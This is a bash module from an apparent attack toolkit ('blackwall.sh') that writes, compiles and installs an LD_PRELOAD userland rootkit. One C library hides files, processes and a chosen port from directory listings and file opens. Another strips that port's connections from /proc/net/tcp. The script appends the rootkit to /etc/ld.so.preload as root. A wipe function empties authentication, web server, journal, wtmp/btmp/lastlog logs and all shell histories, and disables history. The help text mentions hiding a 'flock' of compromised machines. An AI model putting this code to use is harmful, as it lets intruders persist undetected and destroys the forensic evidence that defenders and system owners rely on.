#!/bin/bash

shadow_style() {
    printf '[SHADOW] %s\n' "$1"
}

shadow_arm_sources() {
    local dir="$1"
    local port="$2"
    local key="$3"

    cat > "$dir/.hide.c" << EOF_HIDE
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <dlfcn.h>
static const char *victim[] = {"${key}", ".blk_", "kworker", "sysmon", ":${port}", NULL};
static int guilty(const char *name){
    if(!name) return 0;
    for(int i = 0; victim[i] && victim[i][0]; i++) if(strstr(name, victim[i])) return 1;
    return 0;
}
struct dirent *readdir(DIR *d){
    static struct dirent *(*real)(DIR *) = NULL;
    struct dirent *e;
    if(!real) real = dlsym(RTLD_NEXT, "readdir");
    if(!real) return NULL;
    do { e = real(d); } while(e && guilty(e->d_name));
    return e;
}
struct dirent64 *readdir64(DIR *d){
    static struct dirent64 *(*real)(DIR *) = NULL;
    struct dirent64 *e;
    if(!real) real = dlsym(RTLD_NEXT, "readdir64");
    if(!real) return NULL;
    do { e = real(d); } while(e && guilty(e->d_name));
    return e;
}
int open(const char *p, int f, ...){
    static int (*real)(const char *, int, ...) = NULL;
    va_list ap;
    mode_t m = 0;
    va_start(ap, f);
    m = va_arg(ap, mode_t);
    va_end(ap);
    if(!real) real = dlsym(RTLD_NEXT, "open");
    if(guilty(p)) return -1;
    return real(p, f, m);
}
int open64(const char *p, int f, ...){
    static int (*real)(const char *, int, ...) = NULL;
    va_list ap;
    mode_t m = 0;
    va_start(ap, f);
    m = va_arg(ap, mode_t);
    va_end(ap);
    if(!real) real = dlsym(RTLD_NEXT, "open64");
    if(guilty(p)) return -1;
    return real(p, f, m);
}
int __open_2(const char *p, int f){
    return open(p, f);
}
int __open64_2(const char *p, int f){
    return open64(p, f);
}
EOF_HIDE

    cat > "$dir/.net.c" << EOF_NET
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
static int drop(const char *line){ return line && strstr(line, ":${port}") != NULL; }
FILE *fopen(const char *p, const char *m){
    static FILE *(*real)(const char *, const char *) = NULL;
    if(!real) real = dlsym(RTLD_NEXT, "fopen");
    if(p && strstr(p, "tcp")){
        FILE *f = real(p, m);
        FILE *tmp;
        char *line = NULL;
        size_t cap = 0;
        if(!f) return f;
        tmp = tmpfile();
        if(!tmp){ fclose(f); return NULL; }
        while(getline(&line, &cap, f) > 0){ if(!drop(line)) fputs(line, tmp); }
        free(line);
        fclose(f);
        rewind(tmp);
        return tmp;
    }
    return real(p, m);
}
FILE *fopen64(const char *p, const char *m){
    static FILE *(*real)(const char *, const char *) = NULL;
    if(!real) real = dlsym(RTLD_NEXT, "fopen64");
    if(p && strstr(p, "tcp")) return fopen(p, m);
    return real(p, m);
}
EOF_NET
}

shadow_prepare() {
    local dir="$1"
    local port="$2"
    local key="$3"

    mkdir -p "$dir" 2>/dev/null
    shadow_arm_sources "$dir" "$port" "$key"

    if command -v gcc >/dev/null 2>&1; then
        gcc -shared -fPIC -O2 -w -o "$dir/.hide.so" "$dir/.hide.c" -ldl >/dev/null 2>&1
        gcc -shared -fPIC -O2 -w -o "$dir/.net.so" "$dir/.net.c" -ldl >/dev/null 2>&1
    fi

    rm -f "$dir/.hide.c" "$dir/.net.c" 2>/dev/null

    [ -f "$dir/.hide.so" ] && chmod 644 "$dir/.hide.so" 2>/dev/null
    [ -f "$dir/.net.so" ] && chmod 644 "$dir/.net.so" 2>/dev/null

    printf '%s\n' "$key" ".blk_" "kworker" "sysmon" ":${port}" > "$dir/.blk_hide"
    chmod 644 "$dir/.blk_hide" 2>/dev/null

    if [ -f "$dir/.hide.so" ]; then
        shadow_style "arm: hide.so compiled (readdir + open interposition)"
    else
        shadow_style "arm: gcc failed or absent, wrapper filter still hides the flock"
    fi
}

shadow_apply() {
    local dir="$1"

    if [ "$(id -u)" != "0" ]; then
        shadow_style "preload: needs root, arm built but not armed"
        return 0
    fi

    if [ ! -f "$dir/.hide.so" ]; then
        shadow_style "preload: hide.so missing, skipped"
        return 0
    fi

    if [ -f /etc/ld.so.preload ] && [ ! -f /etc/ld.so.preload.blk ]; then
        cp -f /etc/ld.so.preload /etc/ld.so.preload.blk 2>/dev/null
    fi

    grep -qF "$dir/.hide.so" /etc/ld.so.preload 2>/dev/null || printf '%s\n' "$dir/.hide.so" >> /etc/ld.so.preload
    shadow_style "preload: hide.so armed globally, backup at /etc/ld.so.preload.blk"
}

shadow_wipe() {
    local mode="$1"
    local f
    local uid
    local hist

    uid="$(id -u 2>/dev/null)"

    if [ "$uid" = "0" ]; then
        for f in /var/log/auth.log /var/log/secure /var/log/messages /var/log/cloud-init.log /var/log/apache2/access.log /var/log/apache2/error.log /var/log/nginx/access.log /var/log/nginx/error.log; do
            if [ -f "$f" ]; then
                : > "$f" 2>/dev/null
                chmod 640 "$f" 2>/dev/null
            fi
        done

        for f in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
            if [ -f "$f" ]; then
                cp -f /dev/null "$f" 2>/dev/null || : > "$f" 2>/dev/null
                chmod 660 "$f" 2>/dev/null
            fi
        done

        for f in /root/.bash_history /root/.zsh_history /root/.wget-hsts /root/.lesshst /root/.mysql_history /root/.sqlite_history; do
            [ -f "$f" ] && : > "$f" 2>/dev/null
        done

        rm -rf /var/log/journal/* 2>/dev/null
        shadow_style "wipe: auth/access/journal zeroed, wtmp+btmp+lastlog reset"
    fi

    for hist in "${HOME:-/root}/.bash_history" "${HOME:-/root}/.zsh_history" "${HOME:-/root}/.python_history"; do
        [ -f "$hist" ] && : > "$hist" 2>/dev/null
    done

    export HISTSIZE=0
    export HISTFILESIZE=0
    unset HISTFILE 2>/dev/null

    if [ "$mode" = "now" ]; then
        shadow_style "wipe: this shell's history disabled (HISTSIZE=0, HISTFILE unset)"
    fi
}

shadow_help() {
    echo -e "\n${TXT_RED_PLASMA}MX:// SHADOW // PRESENCE ERASURE${NC}"
    echo -e "${TXT_VOID}──────────────────────────────────────────────────────────────────────────────${NC}"
    echo -e "${TXT_RED_SUPERNOVA}USAGE${NC}  ${TXT_CORE}./blackwall.sh -E [-t <HILL>] [-p <PORT>]${NC}"
    echo -e "${TXT_RED_SUPERNOVA}ARMS${NC}   ${TXT_RED_MAGMA}ld.so.preload hide.so (readdir + open), wrapper PATH in profile.d.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}WIPE${NC}   ${TXT_RED_MAGMA}auth.log, secure, syslog, apache/nginx, journal, wtmp/btmp, all shell history.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}CARE${NC}   ${TXT_RED_MAGMA}a global ld.so.preload hides the checker too. Only arm it after the flock is stable.${NC}"
    echo ""
    echo -e "${TXT_VOID}${ITLC}\"A king does not rule by force, but by the consent of the governed.\"${NC}"
}
